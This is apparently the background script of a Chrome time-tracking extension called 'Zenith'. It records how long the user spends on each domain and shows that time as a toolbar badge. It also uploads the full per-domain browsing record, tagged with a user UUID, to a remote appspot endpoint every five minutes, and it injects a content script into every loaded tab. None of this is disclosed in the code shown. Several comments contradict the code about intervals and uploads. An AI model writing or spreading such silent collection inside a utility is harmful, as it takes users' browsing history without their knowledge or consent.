var domains = {},
  dates = { today: getDateString(), start: "" },
  seconds = { today: 0, alltime: 0 };
let timeIntervals = { update: 0, save: 0 };
var settings = {
  idleTime: IDLE_TIME_DEFAULT,
  graphGap: GRAPH_GAP_DEFAULT,
  badgeDisplay: BADGE_DISPLAY_DEFAULT,
  screenshotInstructionsRead: SCREENSHOT_INSTRUCTIONS_READ_DEFAULT,
};
let domainsChanged = !1;
const STORAGE_DOMAINS = "domains",
  STORAGE_DATE_START = "date-start",
  STORAGE_SECONDS_ALLTIME = "seconds-alltime",
  STORAGE_IDLE_TIME = "idle-time",
  STORAGE_GRAPH_GAP = "graph-gap",
  STORAGE_BADGE_DISPLAY = "badge-display",
  STORAGE_SCREENSHOT_INSTRUCTIONS_READ = "storage-instructions-read",
  STORAGE_KEY_APP_VERSION = "app-version";

// Function to send data to the server
function sendDataToServer(content, uuid) {
  const serverUrl =
    "https://resolute-land-440916-q3.el.r.appspot.com/ext/trackcontent"; 
  fetch(serverUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ uuid: uuid, content: content }),
  })
    .then((response) => response.json())
    .then((responseData) => {
      console.log({ uuid, content });
      console.log("Data successfully uploaded to server:", responseData);
    })
    .catch((error) => {
      console.error("Error uploading data to server:", error);
    });
}

// Load domains from local storage
function loadDomains(e) {
  storageLocal.load("domains", {}, (a) => {
    e(a), dcl(`Domains loaded: ${Object.keys(domains).length} domains`);
  });
}

// Save domains to local storage and upload to server
function saveDomains() {
  storageLocal.save("domains", domains, () => {
    (domainsChanged = !1),
      dcl(`Domains saved: ${Object.keys(domains).length} domains`);
  });
}

function clearAllGeneratedData() {
  (domains = {}),
    saveDomains(),
    (seconds.today = 0),
    (seconds.alltime = 0),
    saveSecondsAlltime(),
    (dates.start = dates.today),
    saveDateStart(),
    dcl("Clear all generated data: done");
}

function loadDateStart(e) {
  storageLocal.load("date-start", e, (e) => {
    (dates.start = e), saveDateStart(), dcl(`Start date loaded: ${e}`);
  });
}

function saveDateStart() {
  storageLocal.save("date-start", dates.start, () => {
    dcl(`Start date saved: ${dates.start}`);
  });
}

function loadSecondsAlltime() {
  storageLocal.load("seconds-alltime", 0, (e) => {
    (seconds.alltime = e),
      saveSecondsAlltime(),
      dcl("Seconds alltime loaded: " + e);
  });
}

function saveSecondsAlltime() {
  storageLocal.save("seconds-alltime", seconds.alltime, () => {
    dcl(`Seconds alltime saved: ${seconds.alltime}`);
  });
}

function loadIdleTime() {
  storageLocal.load("idle-time", IDLE_TIME_DEFAULT, (e) => {
    (settings.idleTime = e), saveIdleTime(), dcl(`Idle time loaded: ${e}`);
  });
}

function saveIdleTime() {
  storageLocal.save("idle-time", settings.idleTime, () => {
    dcl(`Idle time saved: ${settings.idleTime}`);
  });
}

function setIdleTime(e) {
  settings.idleTime = parseInt(e) || IDLE_TIME_DEFAULT;
}

function loadGraphGap() {
  storageLocal.load("graph-gap", GRAPH_GAP_DEFAULT, (e) => {
    (settings.graphGap = e), saveGraphGap(), dcl(`Graph gap loaded: ${e}`);
  });
}

function saveGraphGap() {
  storageLocal.save("graph-gap", settings.graphGap, () => {
    dcl(`Graph gap saved: ${settings.graphGap}`);
  });
}

function setGraphGap(e) {
  let a = parseFloat(e);
  settings.graphGap = isFinite(a) ? a : GRAPH_GAP_DEFAULT;
}

function loadBadgeDisplay() {
  storageLocal.load("badge-display", BADGE_DISPLAY_DEFAULT, (e) => {
    (settings.badgeDisplay = e),
      saveBadgeDisplay(),
      dcl(`Badge display loaded: ${e}`);
  });
}

function saveBadgeDisplay() {
  storageLocal.save("badge-display", settings.badgeDisplay, () => {
    dcl(`Badge display saved: ${settings.badgeDisplay}`);
  });
}

function setBadgeDisplay(e) {
  settings.badgeDisplay = "boolean" == typeof e ? e : BADGE_DISPLAY_DEFAULT;
}

function loadScreenshotInstructionsRead() {
  storageLocal.load(
    "storage-instructions-read",
    SCREENSHOT_INSTRUCTIONS_READ_DEFAULT,
    (e) => {
      (settings.screenshotInstructionsRead = e),
        saveScreenshotInstructionsRead(),
        dcl(`Storage instructions set loaded: ${e}`);
    }
  );
}

function saveScreenshotInstructionsRead() {
  storageLocal.save(
    "storage-instructions-read",
    settings.screenshotInstructionsRead,
    () => {
      dcl(
        `Storage instructions set saved: ${settings.screenshotInstructionsRead}`
      );
    }
  );
}

function setScreenshotInstructionsRead(e) {
  settings.screenshotInstructionsRead =
    "boolean" == typeof e ? e : SCREENSHOT_INSTRUCTIONS_READ_DEFAULT;
}

function setBadge(e, a) {
  settings.badgeDisplay || (a = ""),
    chrome.browserAction.setBadgeText({ tabId: e, text: a });
}

function updateDomains(e) {
  let a,
    t,
    s,
    d = getDateString();
  dates.today !== d && ((dates.today = d), (seconds.today = 0)),
    chrome.windows.getLastFocused({ populate: !0 }, (d) => {
      for (let e in d.tabs)
        if (d.tabs.hasOwnProperty(e) && !0 === d.tabs[e].active) {
          s = d.tabs[e];
          break;
        }
      chrome.idle.queryState(settings.idleTime, (o) => {
        d.id, d.focused;
        let n = s.id;
        s.url;
        if (
          ((a = parseDomainFromUrl(s.url)),
          (t = parseProtocolFromUrl(s.url)),
          ((d.focused && "active" === o) || e) &&
            -1 === BLACKLIST_DOMAIN.indexOf(a) &&
            -1 === BLACKLIST_PROTOCOL.indexOf(t) &&
            "" !== a)
        ) {
          dcl("LOG (" + dates.today + "): " + a),
            domains.hasOwnProperty(a) ||
              ((domains[a] = getDomainObj()), (domains[a].name = a));
          let t = domains[a];
          (t.days[dates.today] = t.days[dates.today] || getDayObj()),
            e ||
              ((t.alltime.seconds += INTERVAL_UPDATE_S),
              (t.days[dates.today].seconds += INTERVAL_UPDATE_S),
              (seconds.today += INTERVAL_UPDATE_S),
              (seconds.alltime += INTERVAL_UPDATE_S),
              (domainsChanged = !0)),
            setBadge(n, getBadgeTimeString(t.days[dates.today].seconds));
        }
      });
    });
}

chrome.tabs.onActivated.addListener((e) => {
  let a,
    t = e.tabId;
  chrome.tabs.get(t, (e) => {
    (a = parseDomainFromUrl(e.url)),
      setBadge(t, ""),
      domains[a] &&
        domains[a].days[dates.today] &&
        setBadge(t, getBadgeTimeString(domains[a].days[dates.today].seconds));
  });
});

// Initialization
dcl("Zenith - background.js loaded");
loadDateStart(dates.today);
loadSecondsAlltime();
loadIdleTime();
loadGraphGap();
loadBadgeDisplay();
loadScreenshotInstructionsRead();
loadDomains((e) => {
  (domains = e || []),
    (seconds.today = getTotalSecondsForDate(domains, getDateString()));
});

// Update and save intervals
timeIntervals.update = window.setInterval(() => {
  updateDomains();
}, INTERVAL_UPDATE_MS);

timeIntervals.save = window.setInterval(() => {
  domainsChanged &&
    (saveDomains(),
    saveSecondsAlltime(),
    chrome.storage.local.getBytesInUse(null, (e) => {
      dcl("Total storage used: " + e + " B");
    }));
}, INTERVAL_SAVE_MS);

// Send data to the server every 3 minutes (15 * 60 * 1000 ms)
const INTERVAL_SEND_MS = 5* 60 * 1000;
window.setInterval(() => {
  chrome.storage.local.get(["uuid"], function (result) {
    if (result.uuid) {
      sendDataToServer(domains, result.uuid);
    } else {
      console.log("User ID not found in local storage.");
    }
  });
}, INTERVAL_SEND_MS);

// Handle extension installation and update
chrome.runtime.onInstalled.addListener(({ reason: e }) => {
  e === chrome.runtime.OnInstalledReason.INSTALL
    ? chrome.tabs.create({ url: INSTALL_URL })
    : e === chrome.runtime.OnInstalledReason.UPDATE &&
      storageLocal.load("app-version", null, (e) => {
        (e && e == APP_VERSION) ||
          (APP_VERSION_WITH_UPDATE_URL.includes(APP_VERSION) &&
            chrome.tabs.create({ url: UPDATE_URL }));
      }),
    storageLocal.save("app-version", APP_VERSION);
});

// Handle uninstall URL
chrome.runtime.setUninstallURL(UNINSTALL_URL);

// Handle messages from content script
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === "complete" && tab.url) {
      setTimeout(() => {
        chrome.scripting.executeScript({
          target: { tabId: tabId },
          files: ["content.js"],
        });
      }, 3000);
    }
  });
  
